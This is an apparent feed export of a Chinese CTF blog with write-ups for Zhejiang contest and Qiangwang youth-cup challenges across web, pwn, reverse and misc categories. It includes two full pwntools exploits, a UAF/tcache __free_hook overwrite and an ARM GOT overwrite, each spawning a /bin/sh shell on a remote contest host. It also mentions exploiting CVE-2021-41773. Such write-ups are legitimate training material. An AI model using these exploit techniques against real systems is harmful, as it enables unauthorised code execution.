class="hljs-string">&#x27;u66hp7nuh01puoaip10pi6o0vzavnu11&#x27;</span><br>s=<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789+=&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">37</span>):<br>    e=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>            <span class="hljs-keyword">if</span> s[((j*i)+<span class="hljs-number">7</span>)%<span class="hljs-number">37</span>]==a[n]:<br>                e=e+s[j]<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><p>爆破出37串字符串，只有一串字符串满足flag格式，即32位十六进制字符串</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-math-1.png"></p><p>flag: <code>799a03b7a82076f5028059681df1b722</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;二战浙江省赛，混了个二等奖。感觉预赛题目都比决赛题目出的好&lt;/p&gt;
&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;ezphp&quot;&gt;&lt;a href=&quot;#ezphp&quot; </summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="浙江" scheme="https://www.lewiserii.top/tags/%E6%B5%99%E6%B1%9F/"/>
    
  </entry>
  
  <entry>
    <title>第五届浙江省大学生网络与信息安全竞赛初赛-WP</title>
    <link href="https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B-wp.html"/>
    <id>https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B-wp.html</id>
    <published>2022-09-17T09:00:00.000Z</published>
    <updated>2022-09-29T08:35:30.101Z</updated>
    
    <content type="html"><![CDATA[<h1 id="战队信息"><a href="#战队信息" class="headerlink" title="战队信息"></a>战队信息</h1><p>Rml</p><p>Rank: 32</p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="nisc-easyweb"><a href="#nisc-easyweb" class="headerlink" title="nisc_easyweb"></a>nisc_easyweb</h3><p>访问<code>/robots.txt</code>，发现<code>/api/record</code>，访问后到<code>/test_api.php</code>，F12得到<code>i=FlagInHere</code>，按题目要求get传参拿到flag</p><h3 id="nisc-学校门户网站"><a href="#nisc-学校门户网站" class="headerlink" title="nisc_学校门户网站"></a>nisc_学校门户网站</h3><p>访问学生系统，任意注册一个用户进入系统拿到flag</p><h3 id="吃豆人吃豆魂"><a href="#吃豆人吃豆魂" class="headerlink" title="吃豆人吃豆魂"></a>吃豆人吃豆魂</h3><p>在index.js中搜到失败返回值，成功返回值就在上一行</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-web3-1.png"></p><p>base64解密拿到flag</p><p><code>REFTQ1RGe2YyMzViMDIzODJhMjIzZmRhNGNlMmVjNjIxNDhkOTRjfQ==</code></p><p><code>DASCTF&#123;f235b02382a223fda4ce2ec62148d94c&#125;</code></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h3><p>因为程序存在<code>uaf</code>，所以连续释放两个<code>chunk</code>，可以获取<code>heap段地址</code>，这样可以计算出<code>tcache bin</code>的地址</p><p>通过覆盖<code>tcache bin</code>的值，在任意地址放置<code>chunk</code>，设置<code>chunk0</code>的<code>size</code>为<code>0x430</code>，并在<code>chunk0+0x430</code>的位置处构造两个<code>0x20</code>字节的<code>chunk</code> 释放<code>chunk0</code>，获取<code>libc</code>地址，再利用<code>tcache bin</code>，可以以最少的<code>chunk</code>数，在<code>free_hook</code>中写入<code>system</code>函数地址</p><p>再次执行<code>free</code>函数调用<code>system(&quot;/bin/sh&quot;)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>p=remote(<span class="hljs-string">&#x27;1.14.97.218&#x27;</span>,<span class="hljs-string">&#x27;27188&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./babyheap&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#1</span><br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br><br>p.readuntil(<span class="hljs-string">&#x27; \n&#x27;</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>heap=d&amp;<span class="hljs-number">0xfffffffffffff000</span>+<span class="hljs-number">0x70</span><br>edit(<span class="hljs-number">1</span>,p64(heap))<br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#3</span><br>edit(<span class="hljs-number">3</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(d-<span class="hljs-number">0x10</span>)+p64(d-<span class="hljs-number">0x10</span>+<span class="hljs-number">0x430</span>))<br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#5</span><br>edit(<span class="hljs-number">5</span>,p64(<span class="hljs-number">0x0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x21</span>))<br>edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x431</span>))<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>p.readuntil(<span class="hljs-string">&#x27; \n&#x27;</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>malloc_hook=d-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>edit(<span class="hljs-number">3</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(free_hook))<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment"># 6</span><br>edit(<span class="hljs-number">6</span>,p64(system))<br>pause()<br>free(<span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-pwn1-1.png"></p><h3 id="new-stack"><a href="#new-stack" class="headerlink" title="new_stack"></a>new_stack</h3><p><em>赛后复现</em></p><p><code>main</code>函数</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-pwn2-1.png"></p><p>后门函数</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-pwn2-2.png"></p><p>后门函数会将我们输入的数据写入栈中，刚好最后<code>8字节</code>可以修改<code>X29寄存器</code>的值，而这个寄存器在程序中是用来临时储存函数第一个参数的寄存器，会用来修改<code>X0寄存器</code>，刚好在后门函数结束后会执行一次输入输出，这时可以通过修改<code>got表</code>控制程序流程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;10.201.15.180&#x27;</span>,<span class="hljs-number">4444</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>e=ELF(<span class="hljs-string">&#x27;./pwn1&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>read_1=<span class="hljs-number">0x4007f4</span><br>ret=<span class="hljs-number">0x400834</span><br>puts_got=e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts=<span class="hljs-number">0x400590</span><br>read=<span class="hljs-number">0x400590</span><br>bss=e.bss(<span class="hljs-number">0x100</span>)<br>p.readuntil(<span class="hljs-string">&#x27;name&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(puts_got-<span class="hljs-number">0x18</span>))<br>p.readuntil(<span class="hljs-string">&#x27;go&#x27;</span>)<br>p.send(p64(read_1)+p64(read)+p64(ret))<br>p.send(p64(puts))<br><span class="hljs-comment"># 因为正常输出会输出puts函数对应got表项中的数值</span><br><span class="hljs-comment"># 这时利用程序的延迟绑定技术，会使puts函数对应got表项中储存真实的puts函数地址</span><br><span class="hljs-comment"># 可以用来获取libc地址</span><br>d=(u64(p.readuntil(<span class="hljs-string">&quot;\nlet&#x27;s go&quot;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))&gt;&gt;<span class="hljs-number">8</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc.address=d-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>p.send(p64(read_1)+p64(read)+p64(ret))<br>p.send(p64(system)+p64(read)+p64(<span class="hljs-number">0x4007f0</span>))<br><span class="hljs-comment"># 先通过 LDP  X29, X30, [SP+0x30+var_30],#0x30 指令设置X29的值为栈中的数值</span><br><span class="hljs-comment"># 并将puts函数设置为system</span><br><span class="hljs-comment"># 这时向栈中写入/bin/sh ，在执行puts函数时就会执行system(&quot;/bin/sh&quot;);</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-pwn2-3.png"></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="ManyCheck"><a href="#ManyCheck" class="headerlink" title="ManyCheck"></a>ManyCheck</h3><p>程序在<code>check1</code>中会检测输入是否等于77</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-re1-1.jpg"></p><p>在<code>check2</code>中输入的第一个数字的平方要等于3025，第二个数的平方要等于2401</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-re1-2.jpg"></p><p>根据<code>reshort16</code>函数得知，将<code>check3</code>输入的数字的高两个字节和低两个字节调换位置后要等于<code>0x66744769</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-re1-4.jpg"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-re1-3.jpg"></p><p>按要求输入完四个数字拿到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-re1-5.png"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="好怪哦"><a href="#好怪哦" class="headerlink" title="好怪哦"></a>好怪哦</h3><p>先将文件反转一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;fuck.zip&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br><br>   <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> g:<br><br>      g.write(f.read()[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p><code>flag.png</code>少了文件头，补上<code>89 50 4e 47</code></p><p>crc报错，修改下高度拿到flag</p><h3 id="神奇的棋盘"><a href="#神奇的棋盘" class="headerlink" title="神奇的棋盘"></a>神奇的棋盘</h3><p><em>赛后复现</em></p><p>lsb查看0通道，发现一串加密字符，base32解密得到<code>LastKey&#123;Yusayyds&#125;</code></p><p>首先是波利比奥斯方阵密码</p><p>手搓或者脚本</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%B3%A2%E5%88%A9%E6%AF%94%E5%A5%A5%E6%96%AF%E6%96%B9%E9%98%B5%E5%AF%86%E7%A0%81.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&#x27;11,22,11,53,53,14,11,22,22,51,22,22,51,14,51,11,14,11,51,53,14,22,11,14,51,22,14,51,11,11,14,14,14,14,21,53,11,21,11,21,14,22,14,51,53,53,14,22,22,14,22,22,14,53,14,14,21,14,14,53,51,22,53,11,14,22,51,14,21,53,51,51,11,11,14,14,53,14,53,53,11,14,14,51,22,22,22,53,22,53,53,53,53,22,53,53,22,22,53,22,14,51,51,51,22,22,22,11,22,11,11,11,11,22,11,11,22,22,11,22,14,14,14,11,22,11,22,22,22,11,22,22,11,22,11,22,11,11,11,51,11,11,11,53,22,53,22,22,22,53,22,22,53,22,53,22,53,53,53,51&#x27;</span><br>a=a.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>t=<span class="hljs-string">&quot;ABCDEFGHIKLMNOPQRSTUVWXYZ&quot;</span><br>n=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    n=n+t[(<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>])-<span class="hljs-number">1</span>)*<span class="hljs-number">5</span>+<span class="hljs-built_in">int</span>(i[<span class="hljs-number">1</span>])-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(n)<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-misc2-1.png"></p><p>得到<code>AGAXXDAGGVGGVDVADAVXDGADVGDVAADDDDFXAFAFDGDVXXDGGDGGDXDDFDDXVGXADGVDFXVVAADDXDXXADDVGGGXGXXXXGXXGGXGDVVVGGGAGAAAAGAAGGAGDDDAGAGGGAGGAGAGAAAVAAAXGXGGGXGGXGXGXXXV</code></p><p>加上key解<code>ADFGVX</code>密码</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-misc2-2.png"></p><p><code>4441534354467b64383539633431633533306166633163316164393461626439326634626166387d</code></p><p>十六进制转字符串得到flag</p><h3 id="segmentFlow"><a href="#segmentFlow" class="headerlink" title="segmentFlow"></a>segmentFlow</h3><p><em>赛后复现</em></p><p>文件很小，直接crc爆破</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-misc3-1.png"></p><p>得到解压密码<code>gZinflAte_BasE64</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-misc3-2.png"></p><p>追踪流，发现<code>sa066b32bfb3e7</code>的值在传递<code>zip</code>文件</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-misc3-3.png"></p><p>tshark提取出来</p><p><code>tshark -r segmentFlow.pcapng -Y &quot;http.request&quot; -T fields -e http.file_data &gt; data.txt</code></p><p>提取压缩包部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>f1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.zip&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<br>data=f.read()<br>data=data.split(<span class="hljs-string">&#x27;&amp;sa066b32bfb3e7=&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(data)):<br>    <span class="hljs-built_in">print</span>(data[i][:<span class="hljs-number">8</span>],end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    f1.write(<span class="hljs-built_in">bytes</span>.fromhex(data[i][:<span class="hljs-number">8</span>]))<br></code></pre></td></tr></table></figure><p>解压得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;战队信息&quot;&gt;&lt;a href=&quot;#战队信息&quot; class=&quot;headerlink&quot; title=&quot;战队信息&quot;&gt;&lt;/a&gt;战队信息&lt;/h1&gt;&lt;p&gt;Rml&lt;/p&gt;
&lt;p&gt;Rank: 32&lt;/p&gt;
&lt;h1 id=&quot;解题过程&quot;&gt;&lt;a href=&quot;#解题过程&quot; class=&quot;h</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="浙江" scheme="https://www.lewiserii.top/tags/%E6%B5%99%E6%B1%9F/"/>
    
  </entry>
  
  <entry>
    <title>强网杯青少年杯初赛wp</title>
    <link href="https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E5%88%9D%E8%B5%9Bwp.html"/>
    <id>https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E5%88%9D%E8%B5%9Bwp.html</id>
    <published>2022-09-10T09:00:00.000Z</published>
    <updated>2022-10-02T04:46:06.484Z</updated>
    
    <content type="html"><![CDATA[<h1 id="战队信息"><a href="#战队信息" class="headerlink" title="战队信息"></a>战队信息</h1><p>战队名称：Rml<br>战队排名：5</p><h1 id="解题情况"><a href="#解题情况" class="headerlink" title="解题情况"></a>解题情况</h1><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qwb/qwbqsn.png"></p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>CVE-2021-41773，payload直接打</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qwb/qwbqsn-web1-1.png"></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h3><p>base64解密后得到一张图片，但是每两个字节被换了位置</p><p>修复脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;a.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>f1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;b.png&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><br>data=f.read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(data),<span class="hljs-number">2</span>):<br>    f1.write(data[i:i+<span class="hljs-number">2</span>][::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p>得到hint<code>密钥就是音乐的财富密码</code>，加上题目描述<code>你知道万能和弦是什么吗?</code>，得到<code>4536251</code></p><p>lsb解密得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qwb/qwbqsn-misc1-1.png"></p><h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p><em>赛后复现</em></p><p>祥云杯<code>shuffle_code</code>的后半部分</p><p>按行打乱了<br>网上的爆破脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python">data = [[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span 